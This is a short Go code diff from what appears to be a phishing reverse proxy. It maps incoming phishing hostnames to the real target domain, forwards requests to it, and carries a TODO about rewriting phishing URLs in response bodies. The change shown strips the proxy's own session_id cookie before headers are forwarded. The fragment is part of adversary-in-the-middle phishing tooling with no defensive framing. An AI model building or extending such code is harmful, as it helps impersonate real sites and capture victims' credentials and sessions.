@@ -26,7 +26,6 @@ type requestProcessor struct {
 // TODO patch phishing URLs in body with original domains
 func (p *requestProcessor) Process(c *fiber.Ctx) *http.Request {
 	r := c.Request()
-	c.Hostname()
 	destURL := &url.URL{
 		Scheme:   "https",
 		Host:     p.conv.ToTarget(utils.UnsafeString(r.URI().Host())),
@@ -45,6 +44,8 @@ func (p *requestProcessor) Process(c *fiber.Ctx) *http.Request {
 	}
 
 	req.Header = make(http.Header)
+	// filter session cookie
+	r.Header.DelCookie("session_id")
 	r.Header.VisitAll(func(k, v []byte) {
 		sk := utils.UnsafeString(k)
 		sv := utils.UnsafeString(v)
